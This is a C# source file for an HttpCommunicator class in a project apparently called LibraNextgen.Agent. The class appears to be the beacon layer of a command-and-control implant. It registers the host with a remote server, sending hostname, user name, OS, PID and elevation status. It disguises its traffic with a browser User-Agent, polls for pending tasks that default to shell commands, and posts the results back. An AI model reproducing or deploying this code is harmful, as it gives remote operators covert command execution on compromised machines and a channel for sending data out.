using System.Text;
using LibraNextgen.Agent.Core;
using LibraNextgen.Common.Models;
using TaskStatus = LibraNextgen.Common.Models.TaskStatus;

namespace LibraNextgen.Agent.Communication;

public class HttpCommunicator : ICommunicator
{
    private readonly HttpClient _http;
    private readonly ConfigManager _config;

    public HttpCommunicator(ConfigManager config)
    {
        _config = config;
        _http = new HttpClient();
        _http.DefaultRequestHeaders.Add("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    }

    public async Task<string> RegisterAsync(
        string hostname, string userName, string os, string arch,
        string publicKey, string hardwareJson, CancellationToken ct)
    {
        var hw = hardwareJson.Length > 0 ? hardwareJson : "null";
        var json = $$"""
            {"hostname":"{{Escape(hostname)}}","userName":"{{Escape(userName)}}",
            "osVersion":"{{Escape(os)}}","arch":"{{Escape(arch)}}",
            "processName":"agent","pid":{{Environment.ProcessId}},
            "isElevated":false,"publicKey":"{{Escape(publicKey)}}",
            "hardware":{{hw}}}
            """.Replace("\n", "").Replace("\r", "");

        var content = new StringContent(json, Encoding.UTF8, "application/json");
        var response = await _http.PostAsync(_config.GetRegisterUrl(), content, ct);
        if (!response.IsSuccessStatusCode) return string.Empty;

        var body = await response.Content.ReadAsStringAsync(ct);
        return ExtractString(body, "agent_id");
    }

    public async Task<AgentTask?> HeartbeatAsync(string agentId, CancellationToken ct)
    {
        var request = new HttpRequestMessage(HttpMethod.Post, _config.GetHeartbeatUrl());
        request.Headers.Add("X-Agent-Id", agentId);
        request.Content = new StringContent("{}", Encoding.UTF8, "application/json");

        var response = await _http.SendAsync(request, ct);
        if (!response.IsSuccessStatusCode) return null;

        var body = await response.Content.ReadAsStringAsync(ct);
        var taskJson = ExtractObject(body, "pendingTask");
        if (string.IsNullOrEmpty(taskJson)) return null;

        return ParseTask(taskJson);
    }

    public async Task SubmitResultAsync(string agentId, string resultJson, CancellationToken ct)
    {
        var request = new HttpRequestMessage(HttpMethod.Post, _config.GetResultUrl());
        request.Headers.Add("X-Agent-Id", agentId);
        request.Content = new StringContent(resultJson, Encoding.UTF8, "application/json");
        await _http.SendAsync(request, ct);
    }

    private static string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

    private static string ExtractString(string json, string key)
    {
        var search = $"\"{key}\":\"";
        var start = json.IndexOf(search, StringComparison.Ordinal);
        if (start < 0) return string.Empty;
        start += search.Length;
        var end = json.IndexOf('"', start);
        return end > start ? json[start..end] : string.Empty;
    }

    private static string ExtractObject(string json, string key)
    {
        var search = $"\"{key}\":";
        var start = json.IndexOf(search, StringComparison.Ordinal);
        if (start < 0) return string.Empty;
        start += search.Length;
        if (start >= json.Length) return string.Empty;

        if (json[start] == 'n') return string.Empty;
        if (json[start] != '{') return string.Empty;

        var depth = 0;
        for (int i = start; i < json.Length; i++)
        {
            if (json[i] == '{') depth++;
            else if (json[i] == '}')
            {
                depth--;
                if (depth == 0) return json[start..(i + 1)];
            }
        }
        return string.Empty;
    }

    private static AgentTask ParseTask(string json)
    {
        return new AgentTask
        {
            Id = ExtractString(json, "id"),
            AgentId = ExtractString(json, "agentId"),
            CreatedBy = ExtractString(json, "createdBy"),
            Command = ExtractString(json, "command"),
            Status = Enum.TryParse<TaskStatus>(ExtractString(json, "status"), out var s) ? s : TaskStatus.Pending,
            CommandType = Enum.TryParse<CommandType>(ExtractString(json, "commandType"), out var c) ? c : CommandType.Shell,
            Output = ExtractString(json, "output"),
            Error = ExtractString(json, "error"),
            TimeoutSeconds = int.TryParse(ExtractString(json, "timeoutSeconds"), out var t) ? t : 60
        };
    }
}
